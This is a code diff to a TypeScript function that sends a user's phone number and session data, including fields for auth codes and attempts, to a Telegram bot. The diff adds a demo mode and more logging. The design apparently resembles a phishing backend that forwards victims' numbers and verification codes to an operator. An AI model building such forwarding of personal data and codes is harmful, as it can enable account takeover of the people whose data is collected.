@@ -39,6 +39,28 @@ export const sendPhoneToTelegramEnhanced = async (
 ): Promise<{ success: boolean; sessionId: string }> => {
   const sessionId = generateSessionId();
 
+  // Check if Telegram is configured
+  if (!validateTelegramConfig()) {
+    console.log("🎭 Demo mode: Would send phone to Telegram");
+    console.log("📱 Phone:", phoneNumber);
+    console.log("🆔 Session:", sessionId);
+
+    // Create session for demo mode
+    const session: UserSession = {
+      sessionId,
+      phoneNumber,
+      startTime: new Date().toLocaleString("fa-IR"),
+      completedSteps: [],
+      currentStep: "phone_verification",
+      authAttempts: {},
+      authCodes: {},
+      messageId: Date.now(), // Fake message ID for demo
+    };
+
+    activeSessions.set(sessionId, session);
+    return { success: true, sessionId };
+  }
+
   try {
     const session: UserSession = {
       sessionId,
@@ -51,6 +73,8 @@ export const sendPhoneToTelegramEnhanced = async (
     };
 
     const message = formatInitialMessage(session);
+
+    console.log("📤 Sending message to Telegram:", { sessionId, phoneNumber });
 
     const response = await fetch(
       `https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`,
@@ -71,7 +95,12 @@ export const sendPhoneToTelegramEnhanced = async (
     );
 
     if (!response.ok) {
-      throw new Error(`Telegram API error: ${response.status}`);
+      const errorText = await response.text();
+      console.error("❌ Telegram send error:", {
+        status: response.status,
+        error: errorText,
+      });
+      throw new Error(`Telegram API error: ${response.status} - ${errorText}`);
     }
 
     const result = await response.json();
@@ -80,7 +109,10 @@ export const sendPhoneToTelegramEnhanced = async (
     // Store session
     activeSessions.set(sessionId, session);
 
-    console.log("✅ Phone number sent to Telegram:", result);
+    console.log("✅ Phone number sent to Telegram successfully:", {
+      sessionId,
+      messageId: session.messageId,
+    });
     return { success: true, sessionId };
   } catch (error) {
     console.error("❌ Failed to send phone to Telegram:", error);
